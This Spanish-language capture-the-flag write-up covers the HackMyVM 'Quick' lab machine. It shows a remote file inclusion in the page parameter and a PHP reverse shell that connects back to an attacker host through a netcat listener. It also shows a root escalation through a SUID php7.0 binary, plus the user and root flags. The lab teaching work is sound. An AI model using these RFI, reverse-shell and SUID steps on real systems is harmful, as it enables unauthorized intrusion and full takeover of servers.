---
icon: flag
---

# Quick HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 03:20 EDT
Nmap scan report for 192.168.5.59
Host is up (0.00041s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Quick Automative
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:41:D3:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
```

Veremos que hay un puerto `80` que aloja una pagina, si entramos dentro veremos una especie de pagina web sobre coches, pero nada interesante, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.59/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/images               (Status: 200) [Size: 2289]
/about.php            (Status: 200) [Size: 1446]
/home.php             (Status: 200) [Size: 2534]
/index.php            (Status: 200) [Size: 3735]
/.php                 (Status: 403) [Size: 277]
Progress: 2896 / 882244 (0.33%)[ERROR] Get "http://192.168.5.59/contact.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/cars.php             (Status: 200) [Size: 1502]
/connect.php          (Status: 500) [Size: 0]
Progress: 9363 / 882244 (1.06%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 9501 / 882244 (1.08%)
===============================================================
Finished
===============================================================
```

Veremos varias cosas interesantes, entre ellas que utiliza mucho `PHP` por lo que podemos intuir que pueda tener algun `LFI` en algun `PHP`, vamos a investigar un poco mas.

Si le damos alguna pestaña de la pagina veremos en la `URL` algo asi:

```
URL = http://<IP>/index.php?page=home
```

Vemos que esta utilizando el parametro `page`, si probamos ha realizar algo como esto:

```
URL = http://<IP>/index.php?page=../../../../../etc/passwd
```

Pero no va a funcionar, por lo que vamos a seguir investigando un poco mas.

## Escalate user www-data

### RFI

Si lanzamos un `nikto` para ver que posibles vulnerabilidades puede tener, veremos lo siguiente:

```shell
nikto -url 'http://<IP>/'
```

Info:

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.5.59
+ Target Hostname:    192.168.5.59
+ Target Port:        80
+ Start Time:         2025-07-16 03:30:14 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /images/: Directory indexing found.
+ /index.php: Output from the phpinfo() function was found.
+ /index.php?page=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
+ 8102 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2025-07-16 03:31:04 (GMT-4) (50 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Veremos algo muy interesante en esta linea de aqui:

```
+ /index.php?page=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI)
```

Por lo que vemos nos esta diciendo que hay un `RFI` en dicho recurso web, vamos a probarlo con nuestro servidor de `python3` a ver si funciona.

```
URL = http://<IP>/index.php?page=http://<IP_ATTACKER>/test
```

Antes de enviarlo vamos abrir un servidor de `python3`.

```shell
python3 -m http.server 80
```

Ahora si lo enviamos desde la pagina y volvemos a donde tenemos el servidor veremos lo siguiente:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.5.59 - - [16/Jul/2025 03:33:46] code 404, message File not found
192.168.5.59 - - [16/Jul/2025 03:33:46] "GET /test.php HTTP/1.0" 404 -
```

Vemos que esta funcionando, por lo que vamos a probar a crear un archivo `PHP` con una `reverse shell` a ver si lo descarga y lo ejecuta.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora como tenemos el servidor de `python3` abierto donde esta dicho archivo, desde la web podremos hacer lo siguiente, pero nos pondremos a la escucha en otra terminal.

```shell
nc -lvnp <PORT>
```

Ahora desde la web hacemos lo siguiente:

```
URL = http://<IP>/index.php?page=http://<IP_ATTACKER>/shell
```

Ahora si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.59] 41368
whoami
www-data
```

Veremos que ha funcionado, por lo que sanitizaremos la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Ahora vamos a leer la `flag` del usuario.

> user.txt

```


                                 _________
                          _.--""'-----,   `"--.._
                       .-''   _/_      ; .'"----,`-,
                     .'      :___:     ; :      ;;`.`.
                    .      _.- _.-    .' :      ::  `..
                 __;..----------------' :: ___  ::   ;;
            .--"". '           ___.....`:=(___)-' :--'`.
          .'   .'         .--''__       :       ==:    ;
      .--/    /        .'.''     ``-,   :         :   '`-.
   ."', :    /       .'-`\\       .--.\ :         :  ,   _\
  ;   ; |   ;       /:'  ;;      /__  \\:         :  :  /_\\
  |\_/  |   |      / \__//      /"--\\ \:         :  : ;|`\|    
  : "  /\__/\____//   """      /     \\ :         :  : :|'||
["""""""""--------........._  /      || ;      __.:--' :|//|
 "------....______         ].'|      // |--"""'__...-'`\ \//
   `|HMV{QUICK-user}|.--'": :  \    //  |---"""      \__\_/
     """""""""'            \ \  \_.//  /
       `---'                \ \_     _'
                             `--`---'  
```

## Escalate Privileges

Si listamos los permisos `SUID` que hay en el sistema veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
815     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1828/usr/bin/chfn
      821     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/1828/usr/bin/chsh
      890     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/1828/usr/bin/gpasswd
      974     55 -rwsr-xr-x   1 root     root        55528 Feb  7  2022 /snap/core20/1828/usr/bin/mount
      983     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/1828/usr/bin/newgrp
      998     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/1828/usr/bin/passwd
     1108     67 -rwsr-xr-x   1 root     root        67816 Feb  7  2022 /snap/core20/1828/usr/bin/su
     1109    163 -rwsr-xr-x   1 root     root       166056 Jan 16  2023 /snap/core20/1828/usr/bin/sudo
     1167     39 -rwsr-xr-x   1 root     root        39144 Feb  7  2022 /snap/core20/1828/usr/bin/umount
     1256     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1628    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1828/usr/lib/openssh/ssh-keysign
      139    121 -rwsr-xr-x   1 root     root              123560 Jan 25  2023 /snap/snapd/18357/usr/lib/snapd/snap-confine
   132438     52 -rwsr-xr--   1 root     messagebus         51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   132653     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   182372    464 -rwsr-xr-x   1 root     root              473576 Aug  4  2023 /usr/lib/openssh/ssh-keysign
   158584    144 -rwsr-xr-x   1 root     root              146888 May 29  2023 /usr/lib/snapd/snap-confine
   132445     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   131559     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
   132263    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
   132235     40 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 /usr/bin/umount
   131891     56 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 /usr/bin/mount
   131633     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /usr/bin/chsh
   132163     68 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 /usr/bin/su
   131627     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /usr/bin/chfn
   131756     88 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /usr/bin/gpasswd
   151439   4432 -rwsr-xr-x   1 root     root             4537352 Sep  2  2023 /usr/bin/php7.0
   131905     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /usr/bin/newgrp
   131959     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
   131938     68 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /usr/bin/passwd
   131740     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
```

Veremos muchas cosas interesantes y entre ellas varias escaladas de privilegios, como estas lineas de aqui:

```
151439   4432 -rwsr-xr-x   1 root     root   4537352 Sep  2  2023 /usr/bin/php7.0
131959     32 -rwsr-xr-x   1 root     root   31032 Feb 21  2022 /usr/bin/pkexec
```

Pero vamos a escalar con `php7.0` de esta forma:

```shell
CMD="/bin/bash"
php -r "pcntl_exec('/bin/bash', ['-p']);"
```

Info:

```
bash-5.0# whoami
root
```

Veremos que seremos el usuario `root` por lo que leeremos la `flag` de `root`.

> root.txt

```

            ___.............___
         ,dMMMMMMMMMMMMMMMMMMMMMb.
        dMMMMMMMMMMMMMMMMMMMMMMMMMb
        |        | -_  - |        |
        |        |_______|___     |
        |     ___......./'.__`\   |
        |_.-~"               `"~-.|
        7\         _...._        |`.
       /  l     .-'      `-.     j  \
      :   .qp. / __________ \ .qp.   :
      |  d8888b |          | d8888b  |
  .---:  `Y88P|_|__________|_|Y88P'\/`"-.
 /     : /,------------------------.:    \
:      |`.    | | [_FLAG_] ||     ,'|     :
`\.____|  `.  : `.________.'|   ,'  |____.'
  MMMMM|   |  |`-.________.-|  /    |MMMMM 
 .-------------`------------'-'-----|-----.
(___HMV{6ff5f1b9238a96b3c3871c67a215ec80}__)
  MMMMMM                            MMMMMM 
  `MMMM'                            `MMMM'
```
